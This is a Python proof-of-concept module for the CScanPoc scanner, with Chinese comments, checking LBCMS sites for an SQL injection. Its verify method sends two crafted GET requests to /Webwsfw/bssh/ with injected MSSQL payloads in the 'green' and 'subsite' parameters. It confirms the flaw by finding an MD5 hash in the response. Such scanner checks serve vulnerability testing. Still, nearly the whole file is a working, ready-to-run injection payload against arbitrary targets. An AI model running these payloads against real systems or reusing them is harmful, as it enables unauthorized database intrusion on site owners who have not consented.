# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'LBCMS_0001' # 平台漏洞编号，留空
    name = 'LBCMS Sql Injection' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-21'  # 漏洞公布时间
    desc = '''
        LBCMS Sql Injection
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0121366
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'LBCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '487fb8e4-abf0-45b5-97aa-1d4b389ee348'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url=arg+"/Webwsfw/bssh/?green=1%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))>0--"
            code,head,res,errcode,_=hh.http(url)
            if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
            url=arg+"/Webwsfw/bssh/?subsite=1%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))>0--"
            code,head,res,errcode,_=hh.http(url)
            if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()